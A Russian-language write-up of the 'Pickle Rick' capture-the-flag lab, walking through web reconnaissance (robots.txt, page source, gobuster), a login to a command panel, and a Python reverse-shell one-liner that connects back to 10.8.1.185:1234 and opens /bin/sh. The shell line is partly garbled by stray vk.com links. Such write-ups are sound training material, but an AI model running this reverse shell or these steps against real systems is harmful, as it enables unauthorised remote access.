# Pickle Rick WriteUp (Easy) ✅

Запустив машину и перейдя по ip, мы видим страницу с текстом и картинкой&#x20;

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p>📌 Добавив в папку /etc/hosts с помощью команды <code>sudo nano /etc/hosts</code> ip машины и ее название, можно обращаться к этому адресу по названию (например rick.thm)</p></figcaption></figure>

Проверив текстовый файл **/robots.txt**, мы можем найти какое-то странное сообщение  (которое в будущем нам понадобится)&#x20;

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Также, просмотрев код сайта, мы можем заметить записку, в которой указано имя пользователя <mark style="color:blue;">**R1ckRul3s**</mark>

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>



Далее, используя инструмент <mark style="color:blue;">**gobuster**</mark>** ** (`gobuster dir -u pent.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x .php)` находим несколько скрытых папок

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Конкретно в данному случае нас интересует папка **/login.php**, перейдя по которой мы попадаем на страницу авторизации

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

В качестве имени пользователя я ввёл ранее найденное имя <mark style="color:blue;">**R1ckRul3s**</mark>, а в качестве пароля - записку в папке **/robots.txt**

Пройдя авторизацию, мы переходим на страницу с командной строкой и несколькими вкладками, которые нам недоступны (впрочем, они и не нужны)

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption><p>С помощью команды <mark style="color:blue;"><strong>ls</strong></mark> мы можем посмотреть, какие файлы находятся в нашем репозитории</p></figcaption></figure>

К сожалению, мы не имеем разрешения вывести содержимое текстового файла с помощью команды <mark style="color:blue;">**cat**</mark>, но введя в адресную строку **ip\_машины/название\_файла.txt** мы можем прочитать то, что в нём находится

🔎 **** Итак, первый ингредиент написан в файле **Sup3rS3cretPickl3Ingred.txt**

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Для того, чтобы подключиться к данной машине, используем **python3 reverse shell**&#x20;

`python3 -c 'import socket,subprocess,os;s=socket.socket(`[`socket.AF`](https://vk.com/away.php?to=http%3A%2F%2Fsocket.AF\&cc\_key=)`_INET,socket.SOCK_STREAM);s.connect(("10.8.1.185",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=`[`subprocess.call`](https://vk.com/away.php?to=http%3A%2F%2Fsubprocess.call\&cc\_key=)`(["/bin/sh","-i"]);'`

Подключив слушатель в терминале Linux и отправив данную оболочку в командную строку, получаем соединение с машиной.

&#x20;

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Перейдя в директорию **/home**, мы можем найти папку **rick**, в которой и находится второй ингредиент

![](<../.gitbook/assets/image (3).png>)
